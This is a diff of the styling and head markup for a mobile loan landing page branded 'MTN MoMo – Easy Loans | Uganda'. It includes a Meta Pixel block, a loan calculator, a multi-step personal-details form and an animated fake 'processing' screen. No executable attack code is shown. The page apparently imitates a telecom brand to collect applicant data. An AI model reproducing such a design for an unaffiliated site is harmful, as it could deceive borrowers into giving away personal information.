@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#000000">
   <title>MTN MoMo – Easy Loans | Uganda</title>
 
   <!-- ============================================
@@ -28,185 +29,998 @@
        END META PIXEL
        ============================================ -->
 
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
   <style>
     :root {
+      --black: #000000;
       --mtn-dark: #003366;
-      --mtn-gold: #FFD700;
-      --mtn-light: #004080;
-      --grad: linear-gradient(to right, #003366, #004080);
-      --page-bg: #F5F5F5;
+      --mtn-mid: #004080;
+      --mtn-gold: #FFCC00;
+      --mtn-gold-light: #FFD633;
+      --mtn-gold-dark: #E6B800;
+      --grad: linear-gradient(135deg, #003366 0%, #004080 100%);
+      --grad-gold: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
+      --page-bg: #f9fafb;
       --white: #FFFFFF;
       --text-dark: #1C2340;
-      --text-mid: #444;
-      --text-light: #888;
-      --border: #ddd;
-      --radius: 12px;
-      --radius-sm: 8px;
+      --text-mid: #4B5168;
+      --text-light: #8B90A3;
+      --border: #E4E7EF;
+      --error: #DC2626;
+      --radius-lg: 22px;
+      --shadow-md: 0 6px 20px rgba(0, 25, 60, 0.08);
+      --shadow-lg: 0 20px 50px rgba(0, 25, 60, 0.12);
     }
+
     * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
     html, body { width: 100%; overflow-x: hidden; }
-    body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
 
-    /* PAGE SYSTEM */
-    .page { display: none; min-height: 100vh; width: 100%; animation: fadeIn 0.3s ease; }
-    .page.active { display: flex; flex-direction: column; }
-    @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--page-bg);
+      color: var(--text-dark);
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
 
-    /* MTN LOGO */
-    .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
-    .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
-    .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
-    .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
-    .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }
+    /* ═══════════ PAGE SYSTEM ═══════════ */
+    .page { display: none; min-height: 100vh; width: 100%; }
+    .page.active { display: flex; flex-direction: column; animation: pageIn 0.4s cubic-bezier(0.22, 1, 0.36, 1); }
+    @keyframes pageIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
 
-    /* NAVBAR */
-    .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:60px; position:relative; flex-shrink:0; width:100%; }
-    .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.75); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; background:none; border:none; font-family:'Inter',sans-serif; }
-    .nav-left:hover { color:#fff; }
-    .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
-    .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }
+    /* ═══════════ HEADER — BLACK ═══════════ */
+    .navbar {
+      background: var(--black);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 18px;
+      height: 74px;
+      position: relative;
+      flex-shrink: 0;
+      width: 100%;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
+      z-index: 10;
+    }
+    .nav-inner {
+      max-width: 1200px;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+    .nav-left {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      color: rgba(255, 255, 255, 0.9);
+      font-size: 0.82rem;
+      font-weight: 700;
+      font-family: 'Inter', sans-serif;
+      padding: 8px 14px;
+      border-radius: 50px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: background 0.2s;
+    }
+    .nav-left:hover {
+      background: rgba(255, 255, 255, 0.18);
+      color: #fff;
+    }
+    .nav-left.hidden { visibility: hidden; }
 
-    /* PROCESSING OVERLAY */
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+      color: inherit;
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .brand-logo-img { height: 48px; width: auto; display: block; }
+    .brand-divider {
+      width: 1px; height: 26px;
+      background: rgba(255, 255, 255, 0.2);
+      margin: 0 4px;
+      flex-shrink: 0;
+    }
+    .brand-sub {
+      font-size: 12px;
+      color: #9ca3af;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+    .nav-right {
+      width: 42px;
+      height: 42px;
+    }
+
+    /* ═══════════ HERO ═══════════ */
+    .hero {
+      width: 100%;
+      max-width: 480px;
+      margin: 20px auto 0;
+      padding: 0 16px;
+    }
+    .hero-card {
+      background: var(--grad-gold);
+      border-radius: var(--radius-lg);
+      padding: 28px 22px 26px;
+      color: #7A5C00;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 20px 40px rgba(255, 204, 0, 0.28);
+    }
+    .hero-card::before {
+      content: '';
+      position: absolute;
+      top: -40px; right: -40px;
+      width: 180px; height: 180px;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.5) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .hero-card::after {
+      content: '';
+      position: absolute;
+      bottom: -60px; left: -40px;
+      width: 160px; height: 160px;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0, 51, 102, 0.12);
+      border: 1px solid rgba(0, 51, 102, 0.22);
+      color: #003366;
+      padding: 6px 12px;
+      border-radius: 50px;
+      font-size: 0.68rem;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 16px;
+      position: relative;
+    }
+    .hero-badge .pulse-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #16A34A;
+      box-shadow: 0 0 0 0 rgba(22, 163, 74, 0.6);
+      animation: pulseDot 1.6s infinite;
+    }
+    @keyframes pulseDot {
+      0% { box-shadow: 0 0 0 0 rgba(22, 163, 74, 0.6); }
+      100% { box-shadow: 0 0 0 10px rgba(22, 163, 74, 0); }
+    }
+    .hero-title {
+      font-size: 1.6rem;
+      font-weight: 900;
+      line-height: 1.15;
+      letter-spacing: -0.025em;
+      margin-bottom: 10px;
+      position: relative;
+      color: #003366;
+    }
+    .hero-title .highlight {
+      color: #7A5C00;
+      background: linear-gradient(135deg, #7A5C00 0%, #A87D00 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      font-style: italic;
+    }
+    .hero-sub {
+      font-size: 0.88rem;
+      color: #5C4A00;
+      line-height: 1.55;
+      position: relative;
+      font-weight: 600;
+    }
+    .hero-sub .em { color: #003366; font-weight: 800; }
+
+    .trust-strip {
+      display: flex;
+      justify-content: space-around;
+      gap: 8px;
+      margin-top: 20px;
+      padding-top: 18px;
+      border-top: 1px solid rgba(0, 51, 102, 0.15);
+      position: relative;
+    }
+    .trust-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      flex: 1;
+    }
+    .trust-item .ico { font-size: 1.05rem; }
+    .trust-item .txt {
+      font-size: 0.66rem;
+      color: #5C4A00;
+      font-weight: 800;
+      text-align: center;
+      line-height: 1.2;
+      letter-spacing: 0.02em;
+      text-transform: uppercase;
+    }
+
+    /* ═══════════ CALCULATOR ═══════════ */
+    .calc-card {
+      background: #fff;
+      border-radius: var(--radius-lg);
+      padding: 24px 22px 26px;
+      margin-top: 18px;
+      box-shadow: 0 8px 28px rgba(0, 25, 60, 0.08);
+      border: 1px solid rgba(0, 51, 102, 0.05);
+      position: relative;
+    }
+    .calc-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .calc-head-title-wrap {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .calc-head-ico {
+      width: 34px; height: 34px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #FFFBEB 0%, #FFF3C0 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.05rem;
+      border: 1px solid #FFE999;
+    }
+    .calc-head-title {
+      font-size: 1rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      line-height: 1.1;
+    }
+    .calc-head-title-sub {
+      font-size: 0.68rem;
+      color: var(--text-light);
+      font-weight: 600;
+      margin-top: 2px;
+    }
+    .calc-head-pill {
+      font-size: 0.62rem;
+      font-weight: 800;
+      color: #7A5C00;
+      background: #FFF8DC;
+      padding: 5px 11px;
+      border-radius: 50px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      border: 1px solid #FFE999;
+    }
+
+    .calc-amount-display {
+      text-align: center;
+      margin-bottom: 22px;
+      padding: 22px 16px;
+      background: linear-gradient(135deg, #F7F9FF 0%, #EEF3FF 100%);
+      border-radius: 16px;
+      border: 1px solid #E8EEFA;
+      position: relative;
+      overflow: hidden;
+    }
+    .calc-amount-display::before {
+      content: '';
+      position: absolute;
+      top: -50px; right: -50px;
+      width: 120px; height: 120px;
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .calc-amount-display .lbl {
+      font-size: 0.68rem;
+      color: var(--text-light);
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      position: relative;
+    }
+    .calc-amount-display .amt {
+      font-size: 2rem;
+      font-weight: 900;
+      color: var(--mtn-dark);
+      letter-spacing: -0.03em;
+      line-height: 1;
+      position: relative;
+      display: inline-flex;
+      align-items: baseline;
+      gap: 4px;
+    }
+    .calc-amount-display .amt .cur {
+      font-size: 1rem;
+      color: var(--text-mid);
+      font-weight: 700;
+    }
+
+    .quick-amounts {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+    }
+    .quick-chip {
+      flex: 1;
+      min-width: 0;
+      padding: 10px 8px;
+      background: #F7F9FF;
+      border: 1.5px solid #E8EEFA;
+      border-radius: 10px;
+      font-size: 0.72rem;
+      font-weight: 800;
+      color: var(--text-mid);
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      transition: all 0.18s;
+      letter-spacing: -0.01em;
+    }
+    .quick-chip:hover {
+      background: #EEF3FF;
+      border-color: #CBD8F5;
+    }
+    .quick-chip.active {
+      background: linear-gradient(135deg, #FFFBEB 0%, #FFF3C0 100%);
+      border-color: var(--mtn-gold);
+      color: #7A5C00;
+      box-shadow: 0 4px 12px rgba(255, 204, 0, 0.25);
+    }
+
+    .slider-wrap { margin: 4px 0 4px; position: relative; }
+    .slider {
+      width: 100%;
+      height: 6px;
+      background: linear-gradient(to right, var(--mtn-dark) 0%, var(--mtn-dark) 33%, #E0E4F0 33%, #E0E4F0 100%);
+      border-radius: 3px;
+      appearance: none;
+      -webkit-appearance: none;
+      outline: none;
+      cursor: pointer;
+    }
+    .slider::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 26px; height: 26px;
+      background: var(--grad-gold);
+      border-radius: 50%;
+      cursor: pointer;
+      border: 3px solid #fff;
+      box-shadow: 0 4px 12px rgba(0, 51, 102, 0.3);
+      transition: transform 0.15s;
+    }
+    .slider::-webkit-slider-thumb:active { transform: scale(1.15); }
+    .slider::-moz-range-thumb {
+      width: 26px; height: 26px;
+      background: var(--grad-gold);
+      border-radius: 50%;
+      cursor: pointer;
+      border: 3px solid #fff;
+      box-shadow: 0 4px 12px rgba(0, 51, 102, 0.3);
+    }
+    .slider-limits {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.68rem;
+      color: var(--text-light);
+      font-weight: 700;
+      margin-top: 10px;
+      letter-spacing: 0.02em;
+    }
+
+    .calc-stats {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 22px;
+    }
+    .stat-box {
+      background: #F7F9FF;
+      border-radius: 14px;
+      padding: 16px 12px;
+      text-align: center;
+      border: 1px solid #EEF2FB;
+    }
+    .stat-box .ico {
+      font-size: 1rem;
+      margin-bottom: 4px;
+      display: block;
+    }
+    .stat-box .lbl {
+      font-size: 0.62rem;
+      color: var(--text-light);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 6px;
+    }
+    .stat-box .val {
+      font-size: 1.02rem;
+      font-weight: 900;
+      color: var(--mtn-dark);
+      letter-spacing: -0.02em;
+      line-height: 1.2;
+    }
+    .stat-box.highlight {
+      background: linear-gradient(135deg, #FFF8DC 0%, #FFF3C0 100%);
+      border-color: #FFE999;
+      box-shadow: 0 4px 14px rgba(255, 204, 0, 0.18);
+    }
+    .stat-box.highlight .val { color: #7A5C00; }
+
+    /* ═══════════ CTA ═══════════ */
+    .cta-wrap {
+      width: 100%;
+      max-width: 480px;
+      margin: 18px auto 26px;
+      padding: 0 16px;
+    }
+    .btn-primary {
+      width: 100%;
+      background: var(--grad);
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      padding: 18px 22px;
+      font-size: 0.95rem;
+      font-weight: 800;
+      letter-spacing: 0.06em;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 10px 24px rgba(0, 51, 102, 0.28);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn-primary::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(120deg, transparent 30%, rgba(255,255,255,0.18) 50%, transparent 70%);
+      transform: translateX(-100%);
+      transition: transform 0.7s;
+    }
+    .btn-primary:hover::after { transform: translateX(100%); }
+    .btn-primary:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 30px rgba(0, 51, 102, 0.38);
+    }
+    .btn-primary:active:not(:disabled) { transform: scale(0.98); }
+    .btn-primary:disabled { opacity: 0.55; cursor: not-allowed; transform: none; }
+
+    .micro-note {
+      text-align: center;
+      font-size: 0.7rem;
+      color: var(--text-light);
+      margin-top: 12px;
+      line-height: 1.5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-weight: 600;
+    }
+
+    /* ═══════════ PROGRESS BAR ═══════════ */
+    .progress-wrap {
+      width: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 24px 16px 0;
+    }
+    .progress-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+    .progress-title {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      letter-spacing: -0.01em;
+    }
+    .progress-pct {
+      font-size: 0.7rem;
+      font-weight: 800;
+      color: #7A5C00;
+      background: #FFF8DC;
+      padding: 5px 11px;
+      border-radius: 50px;
+      border: 1px solid #FFE999;
+      letter-spacing: 0.05em;
+    }
+    .progress-sub {
+      font-size: 0.78rem;
+      color: var(--text-light);
+      margin-bottom: 16px;
+      font-weight: 600;
+    }
+    .progress-bar-track {
+      width: 100%;
+      height: 6px;
+      background: #E0E4F0;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .progress-bar-fill {
+      height: 100%;
+      background: var(--grad-gold);
+      border-radius: 3px;
+      transition: width 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+      box-shadow: 0 0 12px rgba(255, 204, 0, 0.5);
+    }
+
+    /* ═══════════ FORM ═══════════ */
+    .form-wrap {
+      width: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 18px 16px 32px;
+      flex: 1;
+    }
+    .form-card {
+      background: #fff;
+      border-radius: var(--radius-lg);
+      padding: 26px 22px;
+      box-shadow: 0 8px 28px rgba(0, 25, 60, 0.08);
+      border: 1px solid rgba(0, 51, 102, 0.05);
+    }
+    .section-head {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid #EEF2FB;
+    }
+    .section-head .ico {
+      width: 34px; height: 34px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #F7F9FF 0%, #EEF3FF 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.05rem;
+      border: 1px solid #E8EEFA;
+    }
+    .section-head .txt-title {
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: var(--text-dark);
+      line-height: 1.1;
+    }
+    .section-head .txt-sub {
+      font-size: 0.7rem;
+      color: var(--text-light);
+      font-weight: 600;
+      margin-top: 2px;
+    }
+
+    .form-field { margin-bottom: 18px; position: relative; }
+    .form-field label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.8rem;
+      font-weight: 800;
+      color: var(--text-mid);
+      margin-bottom: 8px;
+      letter-spacing: 0.01em;
+      text-transform: uppercase;
+    }
+    .form-field label .lf-ico { font-size: 0.92rem; }
+    .form-field input,
+    .form-field select,
+    .form-field textarea {
+      width: 100%;
+      padding: 15px 16px;
+      border: 1.5px solid var(--border);
+      border-radius: 14px;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: var(--text-dark);
+      background: #FBFCFE;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+      appearance: none;
+      -webkit-appearance: none;
+    }
+    .form-field input::placeholder,
+    .form-field textarea::placeholder { color: #A8AFC0; font-weight: 500; }
+    .form-field input:focus,
+    .form-field select:focus,
+    .form-field textarea:focus {
+      border-color: var(--mtn-dark);
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(0, 51, 102, 0.08);
+    }
+    .form-field input.invalid,
+    .form-field select.invalid,
+    .form-field textarea.invalid {
+      border-color: var(--error);
+      background: #FFF5F5;
+      box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.08);
+      animation: shake 0.4s ease;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+    .form-field select {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%234B5168' d='M6 8 0 0h12z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 18px center;
+      padding-right: 44px;
+    }
+    .form-field textarea { resize: vertical; min-height: 100px; line-height: 1.55; }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .form-hint {
+      font-size: 0.72rem;
+      color: var(--text-light);
+      margin-top: 8px;
+      font-weight: 600;
+    }
+    .field-error {
+      font-size: 0.72rem;
+      color: var(--error);
+      margin-top: 8px;
+      font-weight: 700;
+      display: none;
+    }
+    .field-error.show { display: block; }
+
+    .phone-prefix { display: flex; }
+    .phone-prefix .prefix {
+      padding: 15px 16px;
+      background: #F2F4F9;
+      border: 1.5px solid var(--border);
+      border-right: none;
+      border-radius: 14px 0 0 14px;
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: var(--text-mid);
+      white-space: nowrap;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .phone-prefix input { border-radius: 0 14px 14px 0; }
+
+    .form-actions { display: flex; gap: 12px; margin-top: 26px; }
+    .btn-outline {
+      flex: 1;
+      background: #F2F4F9;
+      color: var(--text-mid);
+      border: none;
+      border-radius: 14px;
+      padding: 16px 20px;
+      font-size: 0.9rem;
+      font-weight: 800;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: background 0.2s;
+    }
+    .btn-outline:hover { background: #E6EAF3; }
+    .btn-outline:active { transform: scale(0.98); }
+    .btn-primary.auto-flex { flex: 1; width: auto; padding: 16px 20px; }
+
+    /* ═══════════ SUMMARY BOX ═══════════ */
+    .summary-box {
+      background: linear-gradient(135deg, #FFFBEB 0%, #FFF8DC 100%);
+      border: 1px solid #FFE999;
+      border-radius: 16px;
+      padding: 18px 20px 12px;
+      margin: 8px 0 24px;
+      position: relative;
+      overflow: hidden;
+    }
+    .summary-box::before {
+      content: '';
+      position: absolute;
+      top: -50px; right: -50px;
+      width: 120px; height: 120px;
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.2) 0%, transparent 70%);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+    .summary-box h4 {
+      font-size: 0.72rem;
+      color: #7A5C00;
+      margin-bottom: 14px;
+      font-weight: 900;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      position: relative;
+    }
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.85rem;
+      padding: 9px 0;
+      color: var(--text-mid);
+      font-weight: 600;
+      border-bottom: 1px dashed rgba(122, 92, 0, 0.15);
+      position: relative;
+    }
+    .summary-row:last-child { border-bottom: none; }
+    .summary-row .val {
+      font-weight: 800;
+      color: #003366;
+      text-align: right;
+      max-width: 60%;
+      word-break: break-word;
+    }
+
+    /* ═══════════ PROCESSING OVERLAY ═══════════ */
     .processing-overlay {
       position: fixed;
       inset: 0;
-      background: #003366;
+      background: radial-gradient(circle at 50% 30%, #003366 0%, #001A33 60%, #000913 100%);
       display: none;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       padding: 32px 24px;
-      z-index: 3000;
-      text-align: center;
-      color: white;
+      z-index: 10000;
+      overflow: hidden;
     }
-    .processing-overlay.show { display: flex; }
+    .processing-overlay.show { display: flex; animation: fadeIn 0.5s ease; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-    .processing-logo {
-      width: 70px;
-      height: 70px;
-      background: #FFD700;
-      border-radius: 14px;
+    .processing-overlay::before {
+      content: '';
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 700px; height: 700px;
+      transform: translate(-50%, -50%);
+      background: radial-gradient(circle, rgba(255, 204, 0, 0.15) 0%, transparent 60%);
+      animation: glowPulse 3s ease-in-out infinite;
+      pointer-events: none;
+    }
+    @keyframes glowPulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
+      50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+    }
+
+    .processing-particles { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
+    .processing-particle {
+      position: absolute;
+      width: 4px; height: 4px;
+      background: var(--mtn-gold);
+      border-radius: 50%;
+      opacity: 0;
+      box-shadow: 0 0 12px rgba(255, 204, 0, 0.8);
+      animation: particleFloat 8s infinite ease-in-out;
+    }
+    .processing-particle:nth-child(1) { left: 10%; top: 80%; animation-delay: 0s; }
+    .processing-particle:nth-child(2) { left: 25%; top: 60%; animation-delay: 1.2s; }
+    .processing-particle:nth-child(3) { left: 80%; top: 75%; animation-delay: 2.4s; }
+    .processing-particle:nth-child(4) { left: 65%; top: 85%; animation-delay: 3.6s; }
+    .processing-particle:nth-child(5) { left: 45%; top: 90%; animation-delay: 4.8s; }
+    .processing-particle:nth-child(6) { left: 88%; top: 45%; animation-delay: 6s; }
+    .processing-particle:nth-child(7) { left: 12%; top: 40%; animation-delay: 7.2s; }
+    .processing-particle:nth-child(8) { left: 55%; top: 15%; animation-delay: 5.4s; }
+    @keyframes particleFloat {
+      0% { opacity: 0; transform: translateY(0) scale(0.6); }
+      15% { opacity: 1; transform: translateY(-30px) scale(1.1); }
+      80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
+      100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
+    }
+
+    .processing-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 340px;
+      text-align: center;
+      position: relative;
+      z-index: 2;
+    }
+    .processing-orbit { width: 140px; height: 140px; position: relative; margin-bottom: 34px; }
+    .processing-orbit-ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 2px dashed rgba(255, 204, 0, 0.35);
+      animation: rotateSlow 10s linear infinite;
+    }
+    .processing-orbit-ring.inner {
+      inset: 22px;
+      border: 1.5px dashed rgba(255, 204, 0, 0.55);
+      animation: rotateSlow 6s linear infinite reverse;
+    }
+    @keyframes rotateSlow { to { transform: rotate(360deg); } }
+    .processing-orbit-core {
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 72px; height: 72px;
+      transform: translate(-50%, -50%);
+      border-radius: 18px;
+      background: var(--grad-gold);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 2.2rem;
-      font-weight: 900;
-      color: #003366;
-      margin-bottom: 32px;
-      position: relative;
+      box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
+      animation: corePulse 2s ease-in-out infinite;
+      padding: 8px;
     }
-    .processing-logo::after { content: 'M'; }
-
-    .processing-spinner {
-      width: 60px;
-      height: 60px;
-      border: 5px solid rgba(255,215,0,0.2);
-      border-top-color: #FFD700;
+    .processing-orbit-core img { width: 100%; height: 100%; object-fit: contain; }
+    @keyframes corePulse {
+      0%, 100% {
+        box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
+        transform: translate(-50%, -50%) scale(1);
+      }
+      50% {
+        box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5);
+        transform: translate(-50%, -50%) scale(1.06);
+      }
+    }
+    .processing-dot-orbit { position: absolute; inset: 0; animation: rotateSlow 3.5s linear infinite; }
+    .processing-dot-orbit span {
+      position: absolute;
+      width: 8px; height: 8px;
       border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      margin-bottom: 28px;
+      background: var(--mtn-gold);
+      box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    .processing-dot-orbit span:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
+    .processing-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
+    .processing-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
+    .processing-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
 
     .processing-title {
-      font-size: 1.4rem;
-      font-weight: 700;
-      color: white;
-      margin-bottom: 8px;
+      font-size: 20px;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 10px;
+      line-height: 1.35;
+      letter-spacing: -0.3px;
+    }
+    .processing-title .highlight {
+      background: linear-gradient(90deg, #FFCC00, #FFD633);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
     }
     .processing-sub {
-      font-size: 0.9rem;
-      color: rgba(255,255,255,0.7);
-      margin-bottom: 24px;
+      font-size: 13.5px;
+      color: rgba(255, 255, 255, 0.7);
+      line-height: 1.6;
+      margin-bottom: 30px;
+      font-weight: 500;
+      min-height: 1.4em;
     }
-    .processing-dots span {
-      display: inline-block;
-      animation: dotBlink 1.4s infinite both;
-      font-size: 1.5rem;
-      color: #FFD700;
+    .processing-bar {
+      width: 240px;
+      height: 6px;
+      background: rgba(255, 204, 0, 0.12);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 30px;
+      position: relative;
     }
-    .processing-dots span:nth-child(1) { animation-delay: 0s; }
-    .processing-dots span:nth-child(2) { animation-delay: 0.2s; }
-    .processing-dots span:nth-child(3) { animation-delay: 0.4s; }
-    @keyframes dotBlink {
-      0%, 80%, 100% { opacity: 0.2; }
-      40% { opacity: 1; }
+    .processing-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
+      background-size: 200% 100%;
+      border-radius: 4px;
+      transition: width 0.4s ease;
+      box-shadow: 0 0 14px rgba(255, 204, 0, 0.7);
+      animation: shimmer 2s linear infinite;
+    }
+    @keyframes shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+    .processing-step {
+      position: relative;
+      height: 20px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+    .processing-step-inner {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+    .processing-step-text {
+      height: 20px;
+      line-height: 20px;
+      font-size: 12px;
+      color: rgba(255, 204, 0, 0.9);
+      font-weight: 700;
+      letter-spacing: 0.03em;
+    }
+    .processing-status-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 11.5px;
+      color: rgba(255, 255, 255, 0.5);
+      font-weight: 600;
